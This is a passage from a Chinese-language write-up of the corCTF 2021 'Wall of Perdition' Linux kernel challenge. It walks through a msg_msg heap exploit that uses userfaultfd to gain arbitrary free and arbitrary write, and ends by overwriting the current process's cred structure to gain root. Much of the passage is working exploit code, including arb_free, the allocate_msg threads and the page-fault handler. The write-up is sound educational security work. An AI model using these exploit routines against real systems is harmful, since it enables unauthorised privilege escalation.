leak = arb_read(0, current_task, 0x2000, 1) + 0x1fa;
cred_struct = leak[0x540/8];
printf("[+] Leaked current task cred struct: 0x%lx\n", cred_struct);

[...]
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01ee788fd02c9f6dd4.png)

### <a class="reference-link" name="4.3%20%E6%AD%A5%E9%AA%A43%E2%80%94%E2%80%94%E4%BB%BB%E6%84%8F%E9%87%8A%E6%94%BE"></a>4.3 步骤3——任意释放

**目标**：目前已获取当前进程的task地址和cred地址，需构造任意写，但前提需要构造任意释放。根本目标是构造重叠的`kmalloc-4096`堆块，让其既充当一个消息的`msg_msgseg` segment，又充当另一个消息的`msg_msg`，这样就能覆写`msg_msg-&gt;next`指针构造任意写。 问题，为什么不构造重叠的`kmalloc-64`？因为`kmalloc-64`作为`msg_msg`的话不可能有segment，不能伪造它的`msg_msg-&gt;next`来任意写；且传入的长度已确定，无法写segment来任意写。

**释放消息**：首先释放**QID #1**中的消息，两次调用`msgrcv()`（不带`MSG_COPY` flag）。
- （1）第一次调用 `msgrcv()`，内核释放**`QID #1`**中第1个消息-`kmalloc-64`；
- （2）第二次调用 `msgrcv()`，内核释放第2个消息-`kmalloc-4096`和相应的segment（也在`kmalloc-4096`中）。
```
[...]

msgrcv(qid[1], memdump, 0x1ff8, 1, IPC_NOWAIT | MSG_NOERROR); // [1]
msgrcv(qid[1], memdump, 0x1ff8, 1, IPC_NOWAIT | MSG_NOERROR); // [2]

[...]
```

内存布局如下：

[![](https://p4.ssl.qhimg.com/t01881bce062930be55.png)](https://p4.ssl.qhimg.com/t01881bce062930be55.png)

**kmalloc-4096释放顺序**：注意，前面的exp中，我们泄露了`kmalloc-4096`的地址（**QID #1** 中消息2的`msg_msg`地址），前面我们第2次调用`msgrcv()`时，内核调用 `do_msgrcv()` -&gt; `free_msg()` 先释放 `kmalloc-4096`的`msg_msg`，再释放`kmalloc-4096`的segment，由于后进先出，分配新的消息时会先获取segment对应的`kmalloc-4096`，所以新的`msg_msg`占据之前的segment，新的segment占据之前的`msg_msg`。

**申请消息-QID #2**：子线程创建新消息，首先创建队列**QID #2** [2]，再调用`msgsnd()`创建0x1ff8大小的消息（0x30的头和0x1fc8的数据），内核中会创建`0x30+0xfd0`大小的`msg_msg`和`0x8+0xff8`大小的`msg_msgseg`。

用户传入数据位于`page_1 + PAGE_SIZE - 0x10`，使用 [userfaultfd](https://www.kernel.org/doc/html/latest/admin-guide/mm/userfaultfd.html) 来监视 `page_1 + PAGE_SIZE` 位置，等待页错误，**第2个页错误**。当`load_msg()`调用`copy_from_user()`拷贝时触发页错误，结果如下图所示，现在我们已知新的segment地址（**QID #1** 中消息2的`msg_msg`地址），原因已经阐明。**QID #2** 布局如下图所示：

```
[...]

void *allocate_msg1(void *_)
`{`
    printf("[Thread 1] Message buffer allocated at 0x%lx\n", page_1 + PAGE_SIZE - 0x10);

    if ((qid[2] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1) // [2] 创建队列 QID #2 
    `{`
        perror("msgget");
        exit(1);
    `}`

    memset(page_1, 0, PAGE_SIZE);
    ((unsigned long *)(page_1))[0xff0 / 8] = 1;

    if (msgsnd(qid[2], page_1 + PAGE_SIZE - 0x10, 0x1ff8 - 0x30, 0) &lt; 0) // [3] 调用msgsnd() 创建0x1ff8大小的消息，新的`msg_msg`占据之前的segment，新的segment占据之前的`msg_msg`。
    `{`
        puts("msgsend failed!");
        perror("msgsnd");
        exit(1);
    `}`

    puts("[Thread 1] Message sent, *next overwritten!");
`}`

[...]

pthread_create(&amp;tid[2], NULL, allocate_msg1, NULL); // [1] 子线程创建新消息

[...]
```

[![](https://p3.ssl.qhimg.com/t0144e7cace47aa6573.png)](https://p3.ssl.qhimg.com/t0144e7cace47aa6573.png)

**任意释放**：调用`arb_free()`，伪造**QID #0**队列中的消息结构，并释放 **QID #0** 中的消息。

```
[...]

void arb_free(int idx, uint64_t target)
`{`
    struct evil_msg *msg = (struct evil_msg *)malloc(0x100);
    void *memdump = malloc(0x2000);

    msg-&gt;m_list.next = queue;         // [2] 指向 QID #1
    msg-&gt;m_list.prev = queue;
    msg-&gt;m_type =  1;
    msg-&gt;m_ts = 0x10;
    msg-&gt;next = target;             // [3] 下一个segment指向QID #1队列中的segment

    edit_rule(idx, (unsigned char *)msg, OUTBOUND, 0);             // [4] 修改 QID #0 中的消息头结构

    puts("[*] Triggering arb free...");
    msgrcv(qid[0], memdump, 0x10, 1, IPC_NOWAIT | MSG_NOERROR); // [5] 释放 QID #0 中的消息
    puts("[+] Target freed!");

    free(memdump);
    free(msg);
`}`

[...]

arb_free(0, large_msg);             // [1]

[...]
```
<li>
`[2]`：我们用之前泄露的 **QID #1** 队列的地址，来修复 **QID #0** 中的 `msg_msg-&gt;m_list.next` 和 `msg_msg-&gt;m_list.prev` ，这样我们就能调用 `msgrcv()` 释放 **QID #0** 中的消息，不用 `MSG_COPY` flag 也能避免内核unlink时崩溃。</li>
<li>
`[3]`：使`msg_msg-&gt;next`指向之前泄露的message slab，也就是现在的**QID #2**消息的segment ；</li>
<li>
`[4]`：调用 `edit_rule()` 修改 `msg_msg` 头结构后，堆布局如下：</li>
<li>
`[5]`：不带 `MSG_COPY` flag 调用 `msgrcv()`，内核将会调用`free_msg()`释放 **QID #0** 中的消息和 new segment。</li>
[![](https://p0.ssl.qhimg.com/t019d0fe43d8e2436cd.png)](https://p0.ssl.qhimg.com/t019d0fe43d8e2436cd.png)

### <a class="reference-link" name="4.4%20%E6%AD%A5%E9%AA%A44%E2%80%94%E2%80%94%E4%BB%BB%E6%84%8F%E5%86%99%EF%BC%8C%E7%AF%A1%E6%94%B9cred"></a>4.4 步骤4——任意写，篡改cred

**思路**：现在 **QID #2**中的`msg_msg-&gt;next`指向一个空闲的`kmalloc-4096` （上一步利用任意释放原语所释放）。现在分配新消息占据该`kmalloc-4096`，即可通过**QID #2**篡改新消息的`msg_msg-&gt;next`实现任意写。

```
[...]

void *allocate_msg2(void *_)
`{`
    printf("[Thread 2] Message buffer allocated at 0x%lx\n", page_2 + PAGE_SIZE - 0x10);

    if ((qid[3] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1) // [2] 创建队列 QID #3
    `{`
        perror("msgget");
        exit(1);
    `}`

    memset(page_2, 0, PAGE_SIZE);
    ((unsigned long *)(page_2))[0xff0 / 8] = 1;

    if (msgsnd(qid[3], page_2 + PAGE_SIZE - 0x10, 0x1028 - 0x30, 0) &lt; 0) // [3] 分配0x1028字节的消息（0x30头 + 0xff8数据），内核中会分配1个 `0x30+0xfd0` 的消息块（和之前任意释放的segment位于同一块）和1个`0x8+0x28`字节的segment（位于`kmalloc-64`）。
    `{`
        puts("msgsend failed!");
        perror("msgsnd");
        exit(1);
    `}`

    puts("[Thread 2] Message sent, target overwritten!");
`}`

[...]

pthread_create(&amp;tid[3], NULL, allocate_msg2, NULL);     // [1] 创建子线程执行allocate_msg2()

[...]
```
<li>
`[2]`：创建队列 **QID #3**。</li>
<li>
`[3]`：调用`msgsend()` 分配0x1028字节的消息（0x30头 + 0xff8数据），内核中会分配1个 `0x30+0xfd0` 的消息块（和之前任意释放的segment位于同一块）和1个`0x8+0x28`字节的segment（位于`kmalloc-64`）。</li>
- 用户传入数据位于`page_2 + PAGE_SIZE - 0x10`，使用 [userfaultfd](https://www.kernel.org/doc/html/latest/admin-guide/mm/userfaultfd.html) 来监视 `page_2 + PAGE_SIZE` 位置，等待页错误，**第2个页错误**。触发页错误时，堆布局如下：
[![](https://p4.ssl.qhimg.com/t01e1406fd29876c871.png)](https://p4.ssl.qhimg.com/t01e1406fd29876c871.png)

**篡改QID #3 中`msg_msg-&gt;next`指针**：释放第1个错误处理，将**QID #3**中的`msg_msg-&gt;next`指针，篡改为当前进程的`cred-0x8`（因为segment的头8字节必须为null，避免`load_msg()`访问next segment时崩溃）。

```
[...]

        if (page_fault_location == page_1 + PAGE_SIZE)
        `{`
            printf("[PFH 1] Page fault at 0x%lx\n", page_fault_location);
            memset(buff, 0, PAGE_SIZE);

            puts("[PFH 1] Releasing faulting thread");

            struct evil_msg *msg = (struct evil_msg *)(buff + 0x1000 - 0x40);

            msg-&gt;m_type =  0x1;
            msg-&gt;m_ts = 0x1000;
            msg-&gt;next = (uint64_t)(cred_struct - 0x8); // [1] 将 QID #3 中的 msg_msg-&gt;next 指针，篡改为当前进程的 cred-0x8

            ufd_copy.dst = (unsigned long)(page_fault_location);
            ufd_copy.src = (unsigned long)(&amp;buff);
            ufd_copy.len = PAGE_SIZE;
            ufd_copy.mode = 0;
            ufd_copy.copy = 0;

            for (;;)
            `{`
                if (release_pfh_1)
                `{`
                    if (ioctl(ufd, UFFDIO_COPY, &amp;ufd_copy) &lt; 0)
                    `{`
                        perror("ioctl(UFFDIO_COPY)");
                        exit(1);
                    `}`

                    puts("[PFH 1] Faulting thread released");
                    break;
                `}`
            `}`
        `}`

[...]
```

**篡改cred**：释放第2个错误处理，将当前进程的cred覆盖为0，最终提权。

[![](https://p1.ssl.qhimg.com/t014400c343b22bb106.png)](https://p1.ssl.qhimg.com/t014400c343b22bb106.png)

[![](https://p2.ssl.qhimg.com/t01111719508b5624a0.png)](https://p2.ssl.qhimg.com/t01111719508b5624a0.png)



## 参考

[corCTF 2021 Fire of Salvation Writeup: Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel](https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html)

[[corCTF 2021] Wall Of Perdition: Utilizing msg_msg Objects For Arbitrary Read And Arbitrary Write In The Linux Kernel](https://syst3mfailure.io/wall-of-perdition)

[wall_of_perdition_exploit.c](https://syst3mfailure.io/assets/files/wall_of_perdition/wall_of_perdition_exploit.c)
